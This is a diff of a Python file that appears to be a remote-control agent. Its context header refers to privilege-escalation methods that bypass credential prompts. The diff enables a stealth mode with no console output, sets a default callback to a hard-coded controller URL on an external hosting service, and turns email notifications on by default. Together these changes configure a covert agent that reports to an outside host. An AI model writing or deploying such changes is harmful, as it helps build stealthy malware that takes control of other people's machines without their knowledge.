@@ -80,14 +80,14 @@ PRIVILEGE ESCALATION METHODS (BYPASS CREDENTIAL PROMPT):
 """
 
 # Configuration flags
-SILENT_MODE = False  # Enable console output for debugging
-DEBUG_MODE = False  # Enable debug logging for troubleshooting
+SILENT_MODE = True  # Enable stealth operation (no console output)
+DEBUG_MODE = True  # Enable debug logging for troubleshooting
 DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated attempts
 RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
 
 # Controller URL override flag (set URL via env)
-USE_FIXED_SERVER_URL = False
-FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', '')
+USE_FIXED_SERVER_URL = True
+FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com')
 
 # Fix eventlet issue by patching BEFORE any other imports
 try:
@@ -364,14 +364,14 @@ except ImportError:
 SERVER_URL = FIXED_SERVER_URL if USE_FIXED_SERVER_URL else os.environ.get('CONTROLLER_URL', '')
 
 # Email notification configuration (use Gmail App Password)
-EMAIL_NOTIFICATIONS_ENABLED = os.environ.get('ENABLE_EMAIL_NOTIFICATIONS', '0') == '1'
+EMAIL_NOTIFICATIONS_ENABLED = os.environ.get('ENABLE_EMAIL_NOTIFICATIONS', '1') == '1'
 
 # Expected SHA-256 digests (defaults provided; can be overridden via env)
 EXPECTED_SHA256 = {
     'GMAIL_USERNAME': os.environ.get('GMAIL_USERNAME_SHA256', '9bf243453c355b42fb43ffe4f00f3209546ce85d5cb65aefede18cf728b37c02'),
     'GMAIL_APP_PASSWORD': os.environ.get('GMAIL_APP_PASSWORD_SHA256', '67944508ba70ca1c01ce9aad2feeee49e9381fa01acc3111bdf38b4b5c413da9'),
     'EMAIL_RECIPIENT': os.environ.get('EMAIL_RECIPIENT_SHA256', '9dcd23d7c1418cc163dd845a3dac654d7541f80d727eadf8d0ee54b2d2d2babb'),
-    'FIXED_SERVER_URL': os.environ.get('FIXED_SERVER_URL_SHA256', '2f22cf7e59476c4a6ef746c9a25781e1367f9662bc08ec28cec7b4c3ab8e149f')
+    'FIXED_SERVER_URL': os.environ.get('FIXED_SERVER_URL_SHA256', 'b0e7cb987065e41f72b0be499a0e59aab016c2a9de47a7eaa18a85d9c08b4c63')
 }
 
 # Secrets only come from environment, not hard-coded
